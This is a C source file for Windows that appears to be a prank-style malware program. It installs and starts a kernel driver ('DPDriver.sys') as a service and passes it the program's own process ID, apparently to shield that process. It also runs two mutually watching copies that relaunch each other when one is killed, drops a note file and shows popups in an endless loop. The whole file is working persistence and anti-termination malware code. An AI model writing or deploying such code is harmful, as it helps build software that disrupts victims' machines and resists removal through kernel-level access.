#include "Utils.h"

#define ARG L"monitorproc"

#define SERVICE L"AAAAAmmm"
#define DEVICE L"\\\\.\\AAAAAmmm"
#define DRIVER L"C:\\Windows\\System32\\drivers\\DPDriver.sys"

HANDLE install_driver();
BOOL load_driver(SC_HANDLE svcHandle);

void monitor();

VOID CALLBACK WaitOrTimerCallback(
	_In_  PVOID lpParameter,
	_In_  BOOLEAN TimerOrWaitFired
)
{
	LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
	GetModuleFileName(NULL, procn, MAX_PATH * 2);
	ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
	LocalFree(procn);

	monitor();
}


int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {

	char pid[32] = { 0 };
	sprintf_s(pid, 32, "%lu", GetCurrentProcessId());

	HANDLE device = install_driver();

	ULONG bytesReturned;

	char retbuf[512];

	BOOLEAN result =
		DeviceIoControl
		(
			device,
			0x972,
			pid,
			strlen(pid) + 1,
			retbuf,
			512,
			&bytesReturned,
			NULL
		);
	
	CloseHandle(device);

	int argc;

	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);

	if (argc == 1 || lstrcmpW(argv[1], ARG)) {

		CreateThread(NULL, NULL, &blink, NULL, 0, NULL);

		LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
		GetModuleFileName(NULL, procn, MAX_PATH * 2);

		ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
	}

	monitor();

	createNote(".\\note.txt", "WOowoowowooOOWoWOo", TRUE);

	for (;;) {

		popup("Lol", "Hello!");
		Sleep(10000);
	}
	return 0;
}

BOOL load_driver(SC_HANDLE svcHandle) {

	// Attempt to start the service
	if (!StartService(svcHandle, 0, NULL)) {

		// Check if error was due to the driver already running
		return GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;
	}

	return TRUE;
}


HANDLE install_driver() {

	SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	SC_HANDLE hService = OpenService(hSCManager, SERVICE, SERVICE_ALL_ACCESS);

	BOOL flag = FALSE;

	HANDLE device = NULL;

	/* Installing service (if it doesn't exist yet..) */
	if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {

		hService =
			CreateService
			(
				hSCManager,
				SERVICE,
				SERVICE,
				SC_MANAGER_ALL_ACCESS,
				SERVICE_KERNEL_DRIVER,
				SERVICE_DEMAND_START,
				SERVICE_ERROR_IGNORE,
				DRIVER,
				NULL, NULL, NULL, NULL, NULL

			);
	}
	else if (!hService) {
		load_driver(hService);
	}

	device = CreateFileW
	(
		DEVICE,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (device == INVALID_HANDLE_VALUE) {


		if (load_driver(hService)) {

			device = CreateFileW
			(
				DEVICE,
				GENERIC_READ | GENERIC_WRITE,
				0,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL
			);
		}
	}


	CloseServiceHandle(hService);
	CloseServiceHandle(hSCManager);

	return device;
}

void monitor() {

	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);	// Get all current running processes

	LPWSTR iprocn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 512);			// Get the current process's name
	GetProcessImageFileNameW(GetCurrentProcess(), iprocn, 512);
	iprocn = getImagNameW(iprocn);

	HANDLE cproc;
	char* cprocn = NULL;

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(entry);

	Process32First(snap, &entry);

	HANDLE nh;

	do {

		if (!lstrcmpW(iprocn, entry.szExeFile) && entry.th32ProcessID != GetCurrentProcessId()) {
			cproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
			RegisterWaitForSingleObject(&nh, cproc, WaitOrTimerCallback, NULL, INFINITE, WT_EXECUTEONLYONCE);
			break;
		}

	} while (Process32Next(snap, &entry));


	CloseHandle(snap);		// Snapshot will change each time a process is being created, make sure it is updated
}



